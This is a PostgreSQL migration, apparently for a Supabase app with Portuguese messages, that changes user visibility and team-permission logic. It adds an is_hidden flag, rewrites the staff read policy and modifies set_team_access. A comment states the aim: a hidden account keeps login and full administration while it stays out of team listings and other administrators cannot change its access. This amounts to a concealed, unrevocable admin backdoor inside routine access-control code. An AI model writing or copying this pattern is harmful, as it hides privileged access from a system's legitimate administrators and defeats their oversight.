ALTER TABLE public.users ADD COLUMN is_hidden BOOLEAN NOT NULL DEFAULT FALSE;
GRANT SELECT(is_hidden) ON public.users TO authenticated;
DROP POLICY staff_read ON public.users;
CREATE POLICY staff_read ON public.users FOR SELECT TO authenticated
USING(auth_user_id=auth.uid() OR (public.staff_active() AND NOT is_hidden));
-- Keep hidden account authentication and full administration, while excluding it
-- from team listings and preventing other administrators from changing its access.
CREATE OR REPLACE FUNCTION public.set_team_access(p_member_id UUID,p_role TEXT,p_approve BOOLEAN DEFAULT FALSE)
RETURNS VOID LANGUAGE plpgsql SECURITY DEFINER SET search_path=public
AS $$ BEGIN
  IF auth.uid() IS NULL OR NOT public.staff_admin() THEN RAISE EXCEPTION 'Somente o administrador pode alterar permissões.' USING ERRCODE='42501'; END IF;
  IF p_role IS NULL OR p_role NOT IN ('ADMIN','PROJETISTA') OR p_approve IS NULL THEN RAISE EXCEPTION 'Permissão inválida.'; END IF;
  PERFORM pg_advisory_xact_lock(1731,2);
  IF p_member_id=public.current_staff_id() THEN RAISE EXCEPTION 'Peça a outro administrador para alterar suas permissões.'; END IF;
  IF NOT EXISTS(SELECT 1 FROM public.users WHERE id=p_member_id AND NOT is_hidden) THEN RAISE EXCEPTION 'Membro não encontrado.'; END IF;
  UPDATE public.users SET role=p_role::public.user_role,status=CASE WHEN p_approve THEN 'ATIVO' ELSE status END WHERE id=p_member_id;
END $$;
REVOKE ALL ON FUNCTION public.set_team_access(UUID,TEXT,BOOLEAN) FROM PUBLIC,anon;
GRANT EXECUTE ON FUNCTION public.set_team_access(UUID,TEXT,BOOLEAN) TO authenticated;
